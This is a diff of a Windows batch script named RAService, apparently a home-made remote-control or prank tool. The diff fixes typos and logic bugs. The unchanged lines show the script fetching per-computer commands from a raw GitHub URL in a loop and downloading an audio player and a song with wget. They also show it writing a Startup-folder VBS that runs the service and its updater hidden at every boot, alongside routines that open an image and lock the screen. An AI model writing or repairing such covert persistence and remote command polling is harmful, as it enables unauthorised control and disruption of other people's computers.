@@ -1,8 +1,8 @@
 @echo off
 
-
-if not exist "%userprofile%\RAService\PCnum.sys" set PCnum=1
-if eixst "%userprofile%\RAService\PCnum.sys" set /p PCnum=<"%userprofile%\RAService\PCnum.sys"
+set docls=0
+if not exist "%userprofile%\RAService\PCnum.sys" set PCnum=1000
+if exist "%userprofile%\RAService\PCnum.sys" set /p PCnum=<"%userprofile%\RAService\PCnum.sys"
 set file=https://raw.githubusercontent.com/FBW81C2/RAService/main/Computer%PCnum%.txt
 
 if exist "%userprofile%"\RAService\maindrive.sys set /p maindrive=<"%userprofile%"\RAService\maindrive.sys
@@ -40,7 +40,7 @@ timeout 300
 goto again
 
 :initGANDALF
-start "%userprofile%\RAService\Gandalf.jpg"
+start "" "%userprofile%\RAService\Gandalf.jpg"
 goto again
 
 :initLOCK
@@ -95,7 +95,7 @@ if not exist "%userprofile%\RAService\cmdmp3.exe" goto cmdmp3install
 if not exist "%userprofile%\RAService\song.mp3" goto songinstall
 if not exist "%userprofile%\RAService\Gandalf.jpg" goto Gandalfinstall
 if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RAService.vbs" goto writevbs
-goto finish
+goto finished
 
 
 
@@ -142,7 +142,7 @@ goto ask1
 :cmdmp3install
 if not exist "%userprofile%\RAService\wget\wget.exe" goto install
 "%userprofile%\RAService\wget\wget.exe" https://jiml.us/downloads/cmdmp3.zip -O"%userprofile%\RAService\cmdmp3.zip"
-fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\cmdmp3.exe"
+fc "%userprofile%\RAService\empty.sys" "%userprofile%\RAService\cmdmp3.zip"
 if %errorlevel%==0 goto cmdmp3install
 
 powershell -Command "Expand-Archive \"%userprofile%\RAService\cmdmp3.zip\" -DestinationPath \"%userprofile%\RAService\""
@@ -197,7 +197,7 @@ echo WshShell.Run "%userprofile%\RAService\RAServiceUpdater.bat", 0, True >> %di
 echo WshShell.Run "%userprofile%\RAService\RAService.bat", 0, True >> %directory%
 
 :finished
-cls
+if %docls%==1 cls
 echo Successfully Installed!
 echo Computer will now restart to complete Installation!
 echo If you don't want to restart now just close Tab!
